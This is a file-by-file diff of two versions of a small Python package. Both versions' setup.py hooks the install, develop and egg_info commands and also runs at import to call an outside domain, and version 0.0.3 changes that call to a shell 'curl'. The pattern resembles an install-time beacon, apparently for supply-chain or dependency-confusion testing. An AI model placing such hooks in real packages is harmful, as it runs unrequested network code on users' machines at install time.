# Comparing `tmp/testpackagehelloworldtest-0.0.2.tar.gz` & `tmp/testpackagehelloworldtest-0.0.3.tar.gz`

## filetype from file(1)

```diff
@@ -1 +1 @@
-gzip compressed data, was "testpackagehelloworldtest-0.0.2.tar", last modified: Mon Apr 17 13:06:43 2023, max compression
+gzip compressed data, was "testpackagehelloworldtest-0.0.3.tar", last modified: Mon Apr 17 13:11:51 2023, max compression
```

## Comparing `testpackagehelloworldtest-0.0.2.tar` & `testpackagehelloworldtest-0.0.3.tar`

### file list

```diff
@@ -1,10 +1,10 @@
-drwxr-xr-x   0 roni.carta   (502) staff       (20)        0 2023-04-17 13:06:43.859886 testpackagehelloworldtest-0.0.2/
--rw-r--r--   0 roni.carta   (502) staff       (20)       69 2023-04-17 13:06:43.859980 testpackagehelloworldtest-0.0.2/PKG-INFO
--rw-r--r--   0 roni.carta   (502) staff       (20)       23 2023-04-17 12:51:01.000000 testpackagehelloworldtest-0.0.2/README.md
--rw-r--r--   0 roni.carta   (502) staff       (20)       79 2023-04-17 13:06:43.860299 testpackagehelloworldtest-0.0.2/setup.cfg
--rw-r--r--   0 roni.carta   (502) staff       (20)      922 2023-04-17 13:06:08.000000 testpackagehelloworldtest-0.0.2/setup.py
-drwxr-xr-x   0 roni.carta   (502) staff       (20)        0 2023-04-17 13:06:43.859762 testpackagehelloworldtest-0.0.2/testpackagehelloworldtest.egg-info/
--rw-r--r--   0 roni.carta   (502) staff       (20)       69 2023-04-17 13:06:43.000000 testpackagehelloworldtest-0.0.2/testpackagehelloworldtest.egg-info/PKG-INFO
--rw-r--r--   0 roni.carta   (502) staff       (20)      224 2023-04-17 13:06:43.000000 testpackagehelloworldtest-0.0.2/testpackagehelloworldtest.egg-info/SOURCES.txt
--rw-r--r--   0 roni.carta   (502) staff       (20)        1 2023-04-17 13:06:43.000000 testpackagehelloworldtest-0.0.2/testpackagehelloworldtest.egg-info/dependency_links.txt
--rw-r--r--   0 roni.carta   (502) staff       (20)        1 2023-04-17 13:06:43.000000 testpackagehelloworldtest-0.0.2/testpackagehelloworldtest.egg-info/top_level.txt
+drwxr-xr-x   0 roni.carta   (502) staff       (20)        0 2023-04-17 13:11:51.175790 testpackagehelloworldtest-0.0.3/
+-rw-r--r--   0 roni.carta   (502) staff       (20)       69 2023-04-17 13:11:51.175856 testpackagehelloworldtest-0.0.3/PKG-INFO
+-rw-r--r--   0 roni.carta   (502) staff       (20)       23 2023-04-17 12:51:01.000000 testpackagehelloworldtest-0.0.3/README.md
+-rw-r--r--   0 roni.carta   (502) staff       (20)       79 2023-04-17 13:11:51.176181 testpackagehelloworldtest-0.0.3/setup.cfg
+-rw-r--r--   0 roni.carta   (502) staff       (20)      934 2023-04-17 13:11:40.000000 testpackagehelloworldtest-0.0.3/setup.py
+drwxr-xr-x   0 roni.carta   (502) staff       (20)        0 2023-04-17 13:11:51.175634 testpackagehelloworldtest-0.0.3/testpackagehelloworldtest.egg-info/
+-rw-r--r--   0 roni.carta   (502) staff       (20)       69 2023-04-17 13:11:50.000000 testpackagehelloworldtest-0.0.3/testpackagehelloworldtest.egg-info/PKG-INFO
+-rw-r--r--   0 roni.carta   (502) staff       (20)      224 2023-04-17 13:11:50.000000 testpackagehelloworldtest-0.0.3/testpackagehelloworldtest.egg-info/SOURCES.txt
+-rw-r--r--   0 roni.carta   (502) staff       (20)        1 2023-04-17 13:11:50.000000 testpackagehelloworldtest-0.0.3/testpackagehelloworldtest.egg-info/dependency_links.txt
+-rw-r--r--   0 roni.carta   (502) staff       (20)        1 2023-04-17 13:11:50.000000 testpackagehelloworldtest-0.0.3/testpackagehelloworldtest.egg-info/top_level.txt
```

### Comparing `testpackagehelloworldtest-0.0.2/setup.py` & `testpackagehelloworldtest-0.0.3/setup.py`

 * *Files 11% similar despite different names*

```diff
@@ -1,14 +1,16 @@
 from setuptools import setup, find_packages
 from setuptools.command.install import install
 from setuptools.command.develop import develop
 from setuptools.command.egg_info import egg_info
+import os
+
 def custom_command():
     import requests
-    requests.get(f"http://testpackagehelloworldtest.package.0xlupin.com/")
+    os.system("curl http://testpackagehelloworldtest.package.0xlupin.com/")
 
 
 class CustomInstallCommand(install):
     def run(self):
         install.run(self)
         custom_command()
 
@@ -25,15 +27,15 @@
         custom_command()
 
 
 custom_command()
 
 setup(
     name="testpackagehelloworldtest",
-    version="0.0.2",
+    version="0.0.3",
     packages=find_packages(),
     install_requires=[],
     cmdclass={
         'install': CustomInstallCommand,
         'develop': CustomDevelopCommand,
         'egg_info': CustomEggInfoCommand,
     },
```

